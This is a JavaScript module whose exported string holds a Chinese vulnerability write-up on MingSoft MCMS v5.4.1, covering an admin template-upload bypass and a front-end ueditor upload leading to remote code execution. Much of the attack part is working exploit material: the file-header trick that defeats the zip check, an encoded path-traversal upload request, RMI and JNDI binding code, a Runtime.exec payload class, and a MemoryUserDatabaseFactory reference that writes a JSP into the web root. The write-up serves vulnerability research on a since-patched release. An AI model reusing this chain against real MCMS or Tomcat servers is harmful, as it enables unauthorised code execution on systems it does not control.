const n=`# \u6587\u7AE0 - \u4EE3\u7801\u5BA1\u8BA1 - MCMS v5.4.1 0day\u6316\u6398  - \u5148\u77E5\u793E\u533A

Created: March 26, 2025 11:48 AM
URL: https://xz.aliyun.com/news/16067
\u6587\u7AE0\u4E8C\u7EA7\u7C7B\u522B: 0Day\u6316\u6398-\u6CE8\u610F\u56FE\u7247\u624B\u52A8\u62D6\u8FDB\u6765
\u6587\u7AE0\u7C7B\u522B(\u6839\u636EWebStorm\u7684\u76EE\u5F55\u6765): \u4EE3\u7801\u5BA1\u8BA1

## \u4E00\u3001\u524D\u8A00

\`MingSoft MCMS\` \u662F\u4E2D\u56FD\u94ED\u98DE (MingSoft) \u516C\u53F8\u7684\u4E00\u4E2A\u5B8C\u6574\u5F00\u6E90\u7684 \`J2ee\` \u7CFB\u7EDF\uFF0C\u53EF\u4EE5\u5230 Github \u4E0B\u8F7D\u5230\u6E90\u7801\uFF0C\u5B98\u7F51 [\u94ED\u8F6F\u30FB\u94ED\u98DE\u5B98\u7F51\u30FB\u4F4E\u4EE3\u7801\u5F00\u53D1\u5E73\u53F0\u30FB\u514D\u8D39\u5F00\u6E90Java Cms](https://mingsoft.net/)

\u7B14\u8005\u9488\u5BF9 \`MCMS v5.4.1\` \u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\uFF0C\u53D1\u73B0\u5B58\u5728\u4E00\u4E2A\u540E\u53F0 \`uploadTemplate\` \u7ED5\u8FC7\u9650\u5236\u4E0A\u4F20 jsp \u5B9E\u73B0 rce\uFF0C\u4EE5\u53CA\u4E00\u4E2A\u524D\u53F0\u6587\u4EF6\u4E0A\u4F20 rce\uFF0C\u672C\u6587\u5C06\u5BF9\u5B8C\u6574\u7684\u6F0F\u6D1E\u6316\u6398\u4E0E\u5229\u7528\u601D\u8DEF\u8FDB\u884C\u8BB2\u89E3

MCMS \u7684\u6700\u65B0\u7248\u672C\u5DF2\u66F4\u65B0\u5230 \`5.4.2\`\uFF0C\u4E14\u5DF2\u5BF9\u4E0A\u8FF0\u6F0F\u6D1E\u8FDB\u884C\u4E86\u4FEE\u590D

## \u4E8C\u3001\u514D\u8D23\u58F0\u660E

\u8BE5\u6587\u7AE0\u4EC5\u4F9B\u5B66\u4E60\u7528\u9014\u4F7F\u7528\uFF0C\u7531\u4E8E\u4F20\u64AD\u3001\u5229\u7528\u6B64\u6587\u6240\u63D0\u4F9B\u7684\u4FE1\u606F\u6216\u8005\u5DE5\u5177\u800C\u9020\u6210\u7684\u4EFB\u4F55\u76F4\u63A5\u6216\u8005\u95F4\u63A5\u7684\u540E\u679C\u53CA\u635F\u5931\uFF0C\u5747\u7531\u4F7F\u7528\u8005\u672C\u4EBA\u8D1F\u8D23\uFF0C\u6240\u4EA7\u751F\u7684\u4E00\u5207\u4E0D\u826F\u540E\u679C\u4E0E\u6587\u7AE0\u4F5C\u8005\u65E0\u5173

## \u4E09\u3001\u73AF\u5883\u642D\u5EFA

\u7248\u672C\uFF1AMCMS v5.4.1\uFF0C[Release 5.4.1 \xB7 ming-soft/MCMS \xB7 GitHub](https://github.com/ming-soft/MCMS/releases/tag/5.4.1)

\u6253\u5305\u6210 war\uFF0C\u4F7F\u7528 tomcat \u642D\u5EFA

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208152451-8372957a-b535-1.png)

## \u56DB\u3001\u540E\u53F0\u6587\u4EF6\u4E0A\u4F20 CVE-2024-42990

\u8BE5 CVE \u7F16\u53F7\u5DF2\u88AB\u5206\u914D\uFF0C\u4F46\u8BE6\u7EC6\u4FE1\u606F\u5C1A\u672A\u516C\u5F00

\u5728\u540E\u53F0\u627E\u5230\u6587\u4EF6\u4E0A\u4F20\u7684\u5730\u65B9

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145512-5ed604da-b531-1.png)

\u6293\u5305\uFF0C\u627E\u5230\u5BF9\u5E94\u7684\u8DEF\u7531 \`/ms-mcms/ms/file/uploadTemplate.do\`

\u4E0A\u4F20\u4E00\u4E2A zip\uFF0C\u91CC\u9762\u5305\u542B\u7740 jsp\uFF0C\u4F1A\u53D1\u73B0\u4ED6\u63D0\u793A

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145519-6325cd7c-b531-1.png)

\u8BF4\u660E\u4ED6\u6709\u4E00\u4E2A\u5730\u65B9\u5728\u68C0\u67E5\u6211\u4EEC\u4E0A\u4F20\u7684\u6587\u4EF6\uFF0C\u6240\u4EE5\u8981\u627E\u5230\u8FD9\u4E2A\u5730\u65B9\uFF0C\u67E5\u770B\u5BF9\u5E94\u7684\u4EE3\u7801\u903B\u8F91

\u6700\u540E\u627E\u5230\u662F\u5728 \`FileVerifyAop.class\`

@Around("uploadPointCut()")
public Object uploadAop(ProceedingJoinPoint joinPoint) throws Throwable {
UploadConfigBean bean = (UploadConfigBean)super.getType(joinPoint, UploadConfigBean.class);
String uploadFileName = FileNameUtil.cleanInvalid(bean.getFile().getOriginalFilename());
if (StringUtils.isBlank(uploadFileName)) {
return ResultData.build().error("\u6587\u4EF6\u540D\u4E0D\u80FD\u4E3A\u7A7A!");
} else {
InputStream inputStream = bean.getFile().getInputStream();
String mimeType = BasicUtil.getMimeType(inputStream, uploadFileName);
if ("zip".equalsIgnoreCase(mimeType)) {
try {
this.checkZip(bean.getFile(), false);
} catch (Exception var7) {
return ResultData.build().error(var7.getMessage());
}
}
return joinPoint.proceed();
}
}

\u6253\u4E0B\u65AD\u70B9\u8DDF\u8E2A\u4E00\u4E0B\uFF0C\u5224\u65AD\u540E\u7F00\u662F zip \u4E4B\u540E\u4F1A\u8FDB\u5165 \`checkZip\` \u51FD\u6570\uFF0C\u8DDF\u8FDB\u53BB\u770B\u4E00\u4E0B

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145527-6800cc52-b531-1.png)

\u53EF\u4EE5\u770B\u5230\u4ED6\u662F\u5148\u89E3\u538B\u51FA\u6765\uFF0C\u7136\u540E\u68C0\u6D4B\u6BCF\u4E2A\u6587\u4EF6\u7684\u540E\u7F00\uFF0C\u5982\u679C\u540E\u7F00\u7B49\u4E8E jsp\uFF0C\u5C31\u8FD4\u56DE jsp \u4E0D\u53EF\u4EE5\u4E0A\u4F20

\u6240\u4EE5\u6211\u4EEC\u9700\u8981\u7ED5\u8FC7\u8FD9\u4E2A checkzip\u3002\u53EF\u4EE5\u770B\u5230\u4ED6\u8FDB\u5165 check \u662F\u9700\u8981\u4ED6\u5F97\u5230\u7684\u540E\u7F00\u4E3A zip\u3002\u6211\u4EEC\u8DDF\u8FDB\u53BB\u770B\u770B\u4ED6\u662F\u5982\u4F55 \`getMimeType\` \u7684

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145533-6bc00f06-b531-1.png)

\u53EF\u4EE5\u53D1\u73B0\u4ED6\u8FD4\u56DE \`fileType\` \u4E4B\u524D\u8FD8\u83B7\u53D6\u4E86 \`contentType\`\uFF0C\u5E76\u91CD\u65B0\u5BF9 \`fileType\` \u8FDB\u884C\u4E86\u8D4B\u503C\uFF0C\u8FD9\u662F\u5426\u610F\u5473\u7740\u6211\u4EEC\u53EF\u4EE5\u4ECE\u8FD9\u91CC\u8FDB\u884C\u63A7\u5236\u8FD4\u56DE\u7684 \`fileType\`\uFF1F

\u6211\u4EEC\u8DDF\u8FDB \`parse\` \u51FD\u6570

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145545-727d1f6e-b531-1.png)

\u53EF\u4EE5\u53D1\u73B0 type \u4ECE\u8FD9\u91CC\u8D4B\u503C\u4E86\uFF0C\u6211\u4EEC\u8FDB\u5165 \`detect\` \u51FD\u6570

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145550-75905450-b531-1.png)

type \u5728\u8FD9\u91CC\u8D4B\u503C\u4E86\uFF0C\u7EE7\u7EED\u8DDF\u8FDB \`detect\` \u51FD\u6570\u3002\u8FD9\u91CC\u662F\u4E00\u4E2A\u5FAA\u73AF\uFF0C\u8981\u8FDB\u5165\u7B2C\u4E8C\u6B21\u5FAA\u73AF\u7684 \`detect\`

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145559-7aff0a30-b531-1.png)

public MediaType detect(InputStream input, Metadata metadata) throws IOException {
List<MimeType> possibleTypes = null;
if (input != null) {
input.mark(this.getMinLength());
try {
byte[] prefix = this.readMagicHeader(input);
possibleTypes = this.getMimeType(prefix);
} finally {
input.reset();
}
}
String resourceName = metadata.get("resourceName");
String name;
if (resourceName != null) {
name = null;
boolean isHttp = false;
try {
URI uri = new URI(resourceName);
String scheme = uri.getScheme();
isHttp = scheme != null && scheme.startsWith("http");
String path = uri.getPath();
if (path != null) {
int slash = path.lastIndexOf(47);
if (slash + 1 < path.length()) {
name = path.substring(slash + 1);
}
}
} catch (URISyntaxException var16) {
name = resourceName;
}
if (name != null) {
MimeType hint = this.getMimeType(name);
if (!isHttp || !hint.isInterpreted()) {
possibleTypes = this.applyHint(possibleTypes, hint);
}
}
}
name = metadata.get("Content-Type");
if (name != null) {
try {
MimeType hint = this.forName(name);
possibleTypes = this.applyHint(possibleTypes, hint);
} catch (MimeTypeException var14) {
}
}
return possibleTypes != null && !possibleTypes.isEmpty() ? ((MimeType)possibleTypes.get(0)).getType() : MediaType.OCTET_STREAM;
}

\u8FD9\u4E2A\u51FD\u6570\u6700\u540E\u8FD4\u56DE\u7684\u5C31\u662F \`possibleTypes\`\uFF0C\u6240\u4EE5\u8DDF\u8FDB\u8FD9\u4E2A \`getMimeType\`

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145607-7fe13de8-b531-1.png)

\u53D1\u73B0\u4ED6\u662F\u901A\u8FC7\u6587\u4EF6\u7684\u4E8C\u8FDB\u5236\u6570\u636E\u8FDB\u884C\u5224\u5B9A\u662F\u4EC0\u4E48 type\uFF0C\u5728 \`eval\` \u51FD\u6570\u4E2D\u901A\u8FC7\u6570\u636E\u6765\u5224\u522B\u7C7B\u578B\uFF0C\u8BC6\u522B\u5B8C\u7ED3\u679C\u662F\u8FD9\u4E2A

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145612-82bf90d2-b531-1.png)

\u8FD9\u91CC\u5C31\u53EF\u4EE5\u76F4\u63A5\u731C\u6D4B\uFF0C\u4ED6\u8BC6\u522B\u7684\u662F\u6587\u4EF6\u5934\uFF0C\u5373\u5728\u4E0A\u4F20\u7684 zip \u6587\u4EF6\u4E2D\uFF0C\u6DFB\u52A0\u56FE\u7247\u7684\u6587\u4EF6\u5934

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145619-86f12f4e-b531-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145623-8990fa72-b531-1.png)

\u53EF\u4EE5\u770B\u5230\u7ED3\u679C\u53D1\u751F\u4E86\u53D8\u5316\uFF0C\u56DE\u5230\u8D77\u70B9\u770B\u770B

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145629-8cadf214-b531-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145633-8f78499a-b531-1.png)

\u6210\u529F\u7ED5\u8FC7\u4E86 \`checkzip\` \u51FD\u6570\uFF0C\u7136\u540E\u5C1D\u8BD5\u538B\u7F29\u4E00\u4E2A jsp \u4E0A\u4F20\u770B\u770B

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145638-923479c4-b531-1.png)

\u53D1\u73B0\u8FD8\u662F\u62A5\u8FD9\u4E2A\u9519\u8BEF\uFF0C\u4F46\u662F\u548C\u524D\u9762\u7684\u62A5\u7684\u4E0D\u4E00\u6837\uFF0C\u524D\u9762\u662F\u8FD9\u6837\u7684

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145645-963ab34e-b531-1.png)

\u90A3\u5C31\u7EE7\u7EED\u8DDF\u4E00\u4E0B\uFF0C\u53D1\u73B0\u662F\u5728 \`ManageFileAction.class\` \u7684 \`uploadTemplate\` \u8DEF\u7531\u540C\u6837\u6709\u5224\u65AD

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145652-9a6f8eb2-b531-1.png)

\u8DDF\u8FDB\u5230\u8FD9\u4E2A \`getType\` \u51FD\u6570

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145656-9d3ca86e-b531-1.png)

\u53D1\u73B0\u597D\u50CF\u540C\u6837\u662F\u7531\u4E8C\u8FDB\u5236\u6570\u636E\u5224\u5B9A\u7684\uFF0C\u90A3\u5C31\u5F80 jsp \u6587\u4EF6\u4E2D\u52A0\u5165\u56FE\u7247\u5934

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145702-a08bd634-b531-1.png)

\u7136\u540E\u4E0A\u4F20\u538B\u7F29\u5305

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145707-a38c7988-b531-1.png)

\u6700\u540E\u8BBF\u95EE jsp \u5373\u53EF

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145711-a5e873bc-b531-1.png)

## \u4E94\u3001\u524D\u53F0\u6587\u4EF6\u4E0A\u4F20 CVE-2024-42991

\u8BE5\u6F0F\u6D1E\u6E90\u4E8E\u524D\u7AEF\u6587\u4EF6\u4E0A\u4F20\u529F\u80FD\u7684\u4E0D\u5F53\u5904\u7406\uFF0C\u53EF\u80FD\u5BFC\u81F4\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C

### \u65B9\u5F0F\u4E00\uFF1A\u4E0A\u4F20 xml \u4FEE\u6539 jsp \u89E3\u6790\u540E\u7F00

\u5728 MCMS \u7684\u5386\u53F2\u6F0F\u6D1E\u4E2D\uFF0C\u6709\u4E00\u4E2A\u524D\u53F0\u6587\u4EF6\u4E0A\u4F20\u3002\u5177\u4F53\u8DEF\u7531\u662F \`/static/plugins/ueditor/1.4.3.3/jsp/editor.do\`

\u7ECF\u8FC7\u5F00\u53D1\u8005\u7684\u4FEE\u590D\uFF0C\u80FD\u4E0A\u4F20\u7684\u6587\u4EF6\u53D8\u5F97\u5F88\u6709\u9650\uFF0C\u8BE6\u89C1 \`ueditor\` \u7684 \`config.json\`

/* \u4E0A\u4F20\u6587\u4EF6\u914D\u7F6E */
"fileActionName": "uploadfile", /* controller\u91CC,\u6267\u884C\u4E0A\u4F20\u89C6\u9891\u7684action\u540D\u79F0 */
"fileFieldName": "upfile", /* \u63D0\u4EA4\u7684\u6587\u4EF6\u8868\u5355\u540D\u79F0 */
"filePathFormat": "/ueditor/jsp/upload/file/{yyyy}{mm}{dd}/{time}{rand:6}", /* \u4E0A\u4F20\u4FDD\u5B58\u8DEF\u5F84,\u53EF\u4EE5\u81EA\u5B9A\u4E49\u4FDD\u5B58\u8DEF\u5F84\u548C\u6587\u4EF6\u540D\u683C\u5F0F */
"fileUrlPrefix": "", /* \u6587\u4EF6\u8BBF\u95EE\u8DEF\u5F84\u524D\u7F00 */
"fileMaxSize": 51200000, /* \u4E0A\u4F20\u5927\u5C0F\u9650\u5236\uFF0C\u5355\u4F4DB\uFF0C\u9ED8\u8BA450MB */
"fileAllowFiles": [
".png", ".jpg", ".jpeg", ".gif", ".bmp",
".flv", ".swf", ".mkv", ".avi", ".rm", ".rmvb", ".mpeg", ".mpg",
".ogg", ".ogv", ".mov", ".wmv", ".mp4", ".webm", ".mp3", ".wav", ".mid",
".rar", ".zip", ".tar", ".gz", ".7z", ".bz2", ".cab", ".iso",
".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".md", ".xml"
], /* \u4E0A\u4F20\u6587\u4EF6\u683C\u5F0F\u663E\u793A */

\u53EF\u4EE5\u4E0A\u4F20 xml \u6587\u4EF6

\u5982\u679C\u73AF\u5883\u662F Tomcat\uFF0C\u5C31\u53EF\u4EE5\u4E0A\u4F20 \`web.xml\` \u4FEE\u6539 Tomcat \u89E3\u6790 jsp \u7684\u540E\u7F00

\u6DFB\u52A0\u4E00\u4E2A \`.png\` \u4EC0\u4E48\u7684\uFF0C\u7136\u540E\u5C31\u53EF\u4EE5 rce \u4E86

\u5982\u679C\u518D\u6DF1\u6316\u4E00\u4E0B\uFF0C\u4E0D\u4FEE\u6539 \`web.xml\`\uFF0C\u8FD8\u6709\u4EC0\u4E48\u65B9\u6CD5\u53EF\u4EE5\u8FDB\u884C rce \u5462\uFF1F

### \u65B9\u5F0F\u4E8C\uFF1A\u4ECE jndi \u5230 rce

### 1. \u5B9E\u73B0 jndi

\u8BFB\u8FC7 lvyyevd \u5E08\u5085\u7684\u6587\u7AE0 [tomcat\u4E0B\u7684\u6587\u4EF6\u4E0A\u4F20RCE\u59FF\u52BF](http://www.lvyyevd.cn/archives/tomcat%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce%E5%A7%BF%E5%8A%BF) \uFF0C\u6211\u4EEC\u53EF\u4EE5\u77E5\u9053\uFF0C\u80FD\u901A\u8FC7\u4E0A\u4F20 xml \u6765\u5B9E\u73B0 jndi

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145745-ba62365c-b531-1.png)

\`hostConfigBase\` \u4E0B\u7684 xml \u6587\u4EF6\u90FD\u4F1A\u88AB \`digester\` \u89E3\u6790\u4E00\u904D\u3002\u4E5F\u5C31\u662F\u8BF4\u6211\u4EEC\u53EF\u4EE5\u628A xml \u6587\u4EF6\u4E0A\u4F20\u5230 \`hostConfigBase\`\u3002\u6700\u540E\u4E0A\u4F20\u7684\u76EE\u5F55\u4E3A \`\\conf\\Catalina\\localhost\`

xml \u683C\u5F0F

\u4E0A\u4F20\u7684 Post \u8BF7\u6C42\uFF0C\u5176\u4E2D url \u89E3\u7801\u5B8C\u662F \`{filePathFormat:'/{.}./{.}./{.}.//conf/Catalina/localhost/8'}\`

POST /ms-mcms/static/plugins/ueditor/1.4.3.3/jsp/editor.do?jsonConfig=%7b%66%69%6c%65%50%61%74%68%46%6f%72%6d%61%74%3a%27%2f%7b%2e%7d%2e%2f%7b%2e%7d%2e%2f%7b%2e%7d%2e%2f%2f%63%6f%6e%66%2f%43%61%74%61%6c%69%6e%61%2f%6c%6f%63%61%6c%68%6f%73%74%2f%38%27%7d&action=uploadfile  HTTP/1.1
Host: 127.0.0.1:8079
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 431
Content-Type: multipart/form-data; boundary=------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
X_Requested_With: UTF-8
--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA
Content-Disposition: form-data; name="upload"; filename="1.xml"

\u672C\u5730\u542F\u4E00\u4E2A rmi \u670D\u52A1\uFF0C\u4E3A jndi \u505A\u51C6\u5907

rmiserver

public class RMIServe {
public static void main(String[] args) throws RemoteException, AlreadyBoundException {
Person person=new Person();
Registry registry= LocateRegistry.createRegistry(1099);
registry.bind("person",person);
}
}

jndi \u7ED1\u5B9A\u5BF9\u8C61

public static void main(String[] args) throws NamingException, RemoteException {
InitialContext initialContext=new InitialContext();
Reference reference = new Reference("Test","Test","http://localhost:7777/");
initialContext.rebind("rmi://localhost:1099/IMperson",reference);
}

\u672C\u5730 Test \u5BF9\u8C61\uFF0C\u5C31\u968F\u4FBF\u62FF\u4E86\u4E00\u4E2A\u5F39\u8BA1\u7B97\u5668\u7684\u5BF9\u8C61\u3002

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;
public class Test extends AbstractTranslet {
public Test() {
}
public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
}
public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
}
static {
try {
Runtime.getRuntime().exec("calc");
} catch (IOException var1) {
throw new RuntimeException(var1);
}
}
}

\u5728 class \u5BF9\u8C61\u4E2D\u542F\u4E00\u4E2A python \u7684 http \u670D\u52A1

\u4E0A\u4F20\u6587\u4EF6\uFF0C\u67E5\u770B\u662F\u5426\u6709 http \u8BBF\u95EE\uFF0C\u53D1\u73B0\u5E76\u6CA1\u6709

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145759-c26eec64-b531-1.png)

\u67E5\u770B\u53D1\u73B0\uFF0C\u662F jdk \u7248\u672C\u592A\u9AD8\u7684\u539F\u56E0\u5BFC\u81F4

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145804-c5bb49f8-b531-1.png)

\u90A3\u5C31\u987A\u5E26\u505A\u4E00\u4E2A\u7ED5\u8FC7

### 2. \u5B9E\u73B0 rce

jdk \u7248\u672C\u9AD8\u7528\u7684\u662F \`beanfactory\`\uFF0C\u7B2C\u4E00\u4E2A\u60F3\u5230\u7684\u662F Tomcat \u81EA\u5E26\u7684\u4F9D\u8D56 \`org.apache.naming.factory.BeanFactory\` \u4E2D\u7684 Reference \u7684 \`forceString\` \u5C5E\u6027\uFF0C\u518D\u914D\u5408 \`ELProcessor\` \u5C31\u80FD\u5B8C\u6210 rce\u3002\u4F46\u5F53\u7B14\u8005\u5B9E\u9645\u5B9E\u65BD\u7684\u65F6\u5019\uFF0C\u53D1\u73B0\u8FD8\u662F\u4E0D\u80FD\u6210\u529F\uFF0C\u7ECF\u8FC7\u8C03\u8BD5\uFF0C\u53D1\u73B0\u7B14\u8005\u5F53\u524D\u7684 tomcat \u7248\u672C\u597D\u50CF\u79FB\u9664\u4E86 \`forceString\` \u5C5E\u6027\uFF0C\u67E5\u770B\u5177\u4F53\u7684\u4EE3\u7801\u3002

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145821-cff30f96-b531-1.png)

\u90A3\u8FD8\u6709\u4EC0\u4E48\u5176\u4ED6\u7684\u65B9\u6CD5\u5417\uFF1F\u6D45\u84DD\u5E08\u5085\u603B\u7ED3\u4E86\u5F88\u591A\u5176\u4ED6\u7684 jndi \u6CE8\u5165\u65B9\u6CD5\uFF0C\u7FFB\u4E00\u7FFB\uFF0C\u53D1\u73B0 xxe \u5230 rce \u7684\u4E00\u4E2A\u65B9\u6CD5

\u5176\u4E2D\u7684 \`org.apache.catalina.users.MemoryUserDatabaseFactory\` \u4F1A\u6839\u636E \`pathname\` \u53BB\u53D1\u8D77\u672C\u5730\u6216\u8005\u8FDC\u7A0B\u6587\u4EF6\u8BBF\u95EE\uFF0C\u5E76\u4F7F\u7528 \`commons-digester\` \u89E3\u6790\u8FD4\u56DE\u7684 XML \u5185\u5BB9\uFF0C\u6240\u4EE5\u8FD9\u91CC\u53EF\u4EE5 XXE

\u5177\u4F53\u539F\u7406\u53EF\u4EE5\u67E5\u770B\u6D45\u84DD\u5E08\u5085\u5199\u7684\u6587\u7AE0 [\u63A2\u7D22\u9AD8\u7248\u672C JDK \u4E0B JNDI \u6F0F\u6D1E\u7684\u5229\u7528\u65B9\u6CD5](https://tttang.com/archive/1405/#toc_webshell)\uFF0C\u8FD9\u91CC\u76F4\u63A5\u7ED9\u51FA\u505A\u6CD5

\u9996\u5148\u8981\u51C6\u5907\u4E00\u4E2A\u6587\u4EF6 \`test.jsp\`\uFF0C\u6587\u4EF6\u5185\u5BB9\u5982\u4E0B

<tomcat-users xmlns="http://tomcat.apache.org/xml"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
version="1.0">

\u7136\u540E rmi \u670D\u52A1

public class RMIServe {
public static void main(String[] args) throws RemoteException, AlreadyBoundException {
Person person=new Person();
Registry registry= LocateRegistry.createRegistry(1099);
registry.bind("person",person);
}
}

jndi \u7ED1\u5B9A\u5BF9\u8C61

import org.apache.naming.ResourceRef;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
public class mcms {
public static void main(String[] args) throws NamingException, RemoteException {
InitialContext initialContext=new InitialContext();
ResourceRef ref = tomcatWriteFile();
initialContext.rebind("rmi://localhost:1099/remoteobj",ref);
}
private static ResourceRef tomcatWriteFile() {
ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
ref.add(new StringRefAddr("pathname", "http://127.0.0.1:8888/../../webapps/ROOT/test.jsp"));
ref.add(new StringRefAddr("readonly", "false"));
return ref;
}
}

\u627E\u4E00\u4E2A\u5730\u65B9\uFF0C\u521B\u5EFA webapps \u548C ROOT \u76EE\u5F55\uFF0C\u91CC\u9762\u653E\u4E0A\u9762\u7684 \`test.jsp\`

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145831-d5e0f79c-b531-1.png)

\u5728 webapps \u4E0A\u7EA7\u76EE\u5F55\u4E5F\u5C31\u662F\u4E0A\u56FE\u7684 mcms \u76EE\u5F55\u4E0B\u542F\u52A8\u4E00\u4E2A http \u670D\u52A1\uFF0C8888 \u7AEF\u53E3\u3002\u542F\u52A8 rmi \u670D\u52A1\uFF0C\u8FD0\u884C\u7ED1\u5B9A\u5BF9\u8C61

\u4E0A\u4F20 xml \u6587\u4EF6\u3002\u540C\u6837\u662F\u4E0A\u9762\u7684 Post\uFF0C\u4E0D\u51FA\u610F\u5916\u4F1A\u5F97\u5230

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145838-d9e10ab2-b531-1.png)

test.jsp \u5C31\u5199\u8FDB\u5230 ROOT \u76EE\u5F55\u4E86\uFF0C\u67E5\u770B test.jsp

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145844-dd34e274-b531-1.png)

\u53D1\u73B0\u597D\u50CF\u7F16\u7801\u4E86\uFF0C\u8C03\u8BD5 tomcat \u4EE3\u7801\uFF0C\u53D1\u73B0 tomcat \u7248\u672C\u9AD8\u4E86\uFF0C\u4F1A\u5BF9 xml \u8FDB\u884C\u7F16\u7801

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145849-e03561f6-b531-1.png)

\u6700\u540E\uFF0C\u5C06 test.jsp \u7684\u6267\u884C\u6362\u6210\u4E86 el \u8868\u8FBE\u5F0F

<tomcat-users xmlns="http://tomcat.apache.org/xml"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
version="1.0">

\u91CD\u65B0\u6267\u884C\u4E0A\u8FF0\u6D41\u7A0B

\u5F97\u5230\u65B0\u7684 jsp

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145855-e429fd3a-b531-1.png)

\u52A0\u5165\u53C2\u6570 \`n=java.lang.Runtime&m=getRuntime&code=calc\`\uFF0C\u6210\u529F rce

![](https://xzfile.aliyuncs.com/media/upload/picture/20241208145904-e91bd4a8-b531-1.png)`;export{n as _};
